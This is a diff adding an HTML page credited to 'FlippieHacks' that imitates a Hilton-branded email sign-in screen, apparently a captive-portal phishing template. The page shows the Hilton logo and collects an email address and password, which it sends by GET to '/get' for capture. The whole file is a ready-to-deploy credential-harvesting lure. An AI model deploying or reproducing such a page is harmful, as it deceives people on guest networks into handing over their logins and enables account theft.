@@ -1,0 +1,125 @@
+<!--By FlippieHacks
+https://github.com/FlippieHacks/ -->
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #003066;
+  margin-right: 100px
+}
+
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #003066;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #213e99;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+  margin-top: 10px;
+}
+
+.submit-btn:hover {
+  background: #000000;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg" height="300" width="500" viewBox="-36 -41.2905 312 247.743"><g fill="#213E99"><path d="M143.195 59.546c0 3.032-.77 6.548-2.996 9.661h6.292V20.618h-20.112v19.849c10.876 3.372 16.816 10.342 16.816 19.079"/><path d="M108.429 38.738c4.534 0 8.76 1.062 11.99 1.916-6.841-1.205-17.45.538-22.928 4.859v23.694h20.12V42.25a25.363 25.363 0 019.648 3.915v23.042h4.372c-4.108 4.644-11.805 7.471-18.437 6.431v.974c19.118 1.509 27.219-7.566 27.219-17.769 0-12.02-11.272-19.051-22.802-20.479V20.618h-20.12v17.944c-13.026 2.611-25.778 10.346-25.778 23.17 0 19.735 27.568 31.96 51.583 31.96 36.468 0 64.527-17.619 64.527-42.371C187.823 21.372 147.305 0 115.483 0 79.016 0 52.165 23.167 52.165 47.919c0 12.81 7.2 23.551 16.271 31.037l.685-.461c-7.182-5.969-13.664-15.271-13.664-28.056C57.353 23.357 90.733 8.101 120.44 8.101c21.004 0 58.746 4.856 58.746 39.983 0 18.318-19.577 42.144-60.702 42.144-21.057 0-37.412-11.272-37.412-27.488.001-14.027 10.987-24.002 27.357-24.002M30.521 164.181v-2.769h7.053v-23.929H18.739v23.929h7.233v2.769H0v-2.769h6.6v-48.735H0v-2.769h25.972v2.769h-7.233v21.598h18.835v-21.598h-7.053v-2.769h25.711v2.769h-6.61v48.735h6.61v2.769H30.521m35.669-54.273h11.785v6.431H66.19zm-5.797 54.273v-2.769h6.335v-33.377h-6.335v-2.768h18.028v36.145h5.896v2.769H60.393m26.462 0v-2.769h6.515v-55.877h-6.515v-2.761h18.296v58.638h6.156v2.769H86.855m42.791 0c-6.424 0-9.901-3.303-9.901-8.394v-27.752h-6.343v-2.769h6.343v-15.439c3.573 0 7.315.081 10.977 0v15.439h9.104v2.769h-9.104v33.377h9.287v2.769h-10.363m55.693-20.355c-.981-14.729-13.293-19.812-21.782-19.812-9.543 0-22.397 5.977-22.397 20.435 0 10.452 7.676 20.713 22.669 20.713 13.477 0 19.021-9.016 20.354-12.678 1.068-2.674 1.339-5.801 1.156-8.658zm-21.782 19.103c-4.102 0-6.599-2.051-7.764-4.285-.71-1.34-1.691-3.296-1.691-14.37 0-8.211.176-17.674 9.367-17.674 3.662 0 6.424 1.517 7.947 4.915.534 1.245 1.164 2.497 1.245 12.399.088 9.112.088 19.015-9.104 19.015zm53.24 1.252v-2.769h5.179v-22.939c0-5.179 0-10.262-5.713-10.262-3.216 0-8.481 3.208-9.734 8.481-.447 1.604-.359 3.304-.359 7.581v17.139h5.89v2.769h-23.914v-2.769h6.335v-33.377h-6.335v-2.769h18.024v5.889c1.964-2.497 3.575-4.292 7.413-5.801a18.255 18.255 0 017.053-1.428c.711 0 2.85 0 5.347.71 7.5 2.227 7.859 7.947 7.859 12.056v24.72H240v2.769h-23.203"/></g></svg>
+
+
+
+  
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your email account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+	  
+      <button class="submit-btn" type="submit">Continue</button>
+
+    </form>
+
+  </div>
+
+</div>
+</body>
+</html>
